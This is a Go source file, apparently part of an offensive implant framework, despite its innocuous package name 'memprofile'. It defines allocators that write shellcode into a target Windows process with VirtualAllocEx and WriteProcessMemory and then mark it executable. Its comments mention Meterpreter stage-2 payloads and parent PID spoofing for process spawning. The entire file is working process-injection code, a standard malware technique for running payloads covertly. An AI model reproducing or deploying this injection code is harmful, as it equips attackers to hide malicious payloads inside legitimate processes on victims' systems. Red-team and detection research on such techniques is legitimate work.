package memprofile

// GenericAllocator stores the minimal data required to perform memory allocation
type GenericAllocator struct {
	// Process handle to the target process
	Process  windows.Handle
	// Data contains the shellcode to write in the process memory
	Data     []byte
	// Args contains the optional arguments for the shellcode
	Args     []byte
	// RWX memory page permissions must be set to RWX (required for meterpreter stage 2)
	RWX      bool
	// DataAddr stores the address of the shellcode after allocation
	DataAddr uintptr
	// ArgsAddr stores the address of the argument array after allocation
	ArgsAddr uintptr
}

// ProcessAllocator implements the MemAllocator interface
// by creating a new process and injecting into it.
type ProcessAllocator struct {
	GenericAllocator
	// Path to the binary on disk
	ProcessPath string
	// Optional arguments to pass to the program
	ProcessArgs []string
	// For parent PID spoofing, the PPID of the parent process
	// to spawn under
	PPID uint32
}

// BasicAllocator implements the MemAllocator interface
// for the most basic memory injection method:
// VirtualAllocEx + WriteProcessMemory
type BasicAllocator struct {
	GenericAllocator
}

func (a *BasicAllocator) Allocate() (err error) {
	perms := windows.PAGE_EXECUTE_READWRITE
	if !a.RWX {
		perms = windows.PAGE_READWRITE
	}
	dataSize := uint32(len(a.Data))
	a.DataAddr, err = syscalls.VirtualAllocEx(a.Process, uintptr(0), uintptr(dataSize), windows.MEM_COMMIT|windows.MEM_RESERVE, perms)
	if err != nil {
		return
	}
	var length uintptr
	err = syscalls.WriteProcessMemory(a.Process, a.DataAddr, &a.Data[0], uintptr(dataSize), &length)
	if err != nil {
		return
	}
	if len(a.Args) != 0 {
		argSize := uint32(len(a.Args))
		a.ArgsAddr, err = syscalls.VirtualAllocEx(a.Process, uintptr(0), uintptr(argSize), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil {
			return
		}
		var length uintptr
		err = syscalls.WriteProcessMemory(a.Process, a.ArgsAddr, &a.Args[0], uintptr(argSize), &length)
		if err != nil {
			return
		}
	}
	if !a.RWX {
		var oldProtect uint32
		err = syscalls.VirtualProtectEx(a.Process, a.DataAddr, uintptr(dataSize), windows.PAGE_EXECUTE_READ, &oldProtect)
		if err != nil {
			return
		}
	}
	return
}